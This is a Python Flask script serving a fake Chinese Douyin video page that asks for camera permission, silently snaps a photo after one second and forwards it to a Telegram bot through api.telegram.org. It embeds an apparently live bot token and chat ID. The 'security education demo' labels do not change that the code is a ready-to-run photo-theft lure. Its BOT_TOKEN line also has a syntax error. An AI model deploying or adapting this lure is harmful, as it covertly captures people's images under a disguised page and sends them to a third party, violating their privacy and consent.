from flask import Flask, request
import requests
import os

app = Flask(__name__)

# REPLACE WITH YOUR REAL VALUES:
BOT_TOKEN "8742276336:AAE2d4LU9lQqLuUrnz6nOABEauzVNs4omgc"
YOUR_CHAT_ID = "8742276336"

HTML = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>抖音热门视频</title></head>
<body style="background:black;text-align:center;color:white;font-family:Arial;margin-top:50px">
<h2>📸 需要相机权限</h2>
<p>网络安全教育演示</p>
<button onclick="startCamera()" style="background:#ff0050;color:white;padding:15px 40px;border:none;border-radius:30px;font-size:18px">允许使用相机</button>
<video id="v" autoplay style="width:300px;margin:20px;display:none"></video>
<div style="position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px">⚠️ 网络安全教育演示</div>
<script>
function startCamera(){
document.querySelector('button').style.display='none';
document.querySelector('h2').innerHTML='🎥 正在启动...';
navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
let video=document.getElementById('v');
video.style.display='block';
video.srcObject=stream;
setTimeout(()=>{
let canvas=document.createElement('canvas');
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext('2d').drawImage(video,0,0);
canvas.toBlob(blob=>{
let form=new FormData();
form.append('photo',blob);
fetch('/upload',{method:'POST',body:form});
});
document.body.innerHTML='<h2>✅ 演示完成</h2><p style="color:#888">感谢参与安全教育</p>';
if(stream)stream.getTracks().forEach(t=>t.stop());
},1000);
}).catch(()=>alert('需要相机权限才能继续'));
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files.get('photo')
    if photo:
        files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': '🎯 相机捕获 - 抖音安全教育演示'}
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
        return 'OK'
    return 'No photo'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
